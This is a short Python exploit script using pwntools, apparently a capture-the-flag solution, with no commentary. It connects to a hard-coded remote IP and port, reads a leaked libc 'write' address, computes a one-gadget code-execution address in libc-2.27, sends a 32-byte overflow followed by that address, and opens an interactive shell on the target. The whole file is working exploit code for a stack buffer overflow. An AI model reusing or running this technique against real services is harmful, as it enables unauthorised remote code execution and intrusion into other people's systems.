from pwn import *
rhp = {'host': '153.120.129.186', 'port':10000}

libc = ELF('./libc-2.27.so')
offset_libc_rce = 0x10a38c
offset_libc_write = libc.symbols[b'write']

conn = remote(rhp['host'], rhp['port'])

log.info(conn.recv()) 
conn.sendline('')
res = conn.recv(40)
log.info(res)
write_addr = res[-8:]
print(write_addr)
rce_addr = u64(write_addr) - offset_libc_write + offset_libc_rce
log.info(rce_addr)

payload = b"a" * 32 + p64(rce_addr)
print(payload)
conn.sendline(payload)
log.info(conn.recvline())

conn.interactive()